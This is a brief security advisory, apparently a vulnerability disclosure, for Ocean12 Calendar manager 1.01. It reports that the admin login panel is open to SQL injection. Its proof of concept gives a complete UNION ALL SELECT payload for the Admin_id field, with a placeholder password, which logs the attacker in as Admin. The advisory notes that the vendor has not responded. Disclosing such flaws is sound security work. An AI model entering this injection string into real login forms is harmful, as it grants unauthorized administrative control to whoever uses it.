Zinho's Security Advisory        


Product: Ocean12 Calendar manager 1.01 
Site: www.ocean12scripts.com 

The admin login panel suffers of an sql injection that allows anyone 
to log in as Admin. 

Proof of concept: 
/// 
- Admin_id: Admin' UNION ALL SELECT   id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,id,i d,id FROM settings WHERE Admin_id='Admin 

Admin_password: 1 

/// 

Vendor has been contacted some weeks ago. No response received so  far.
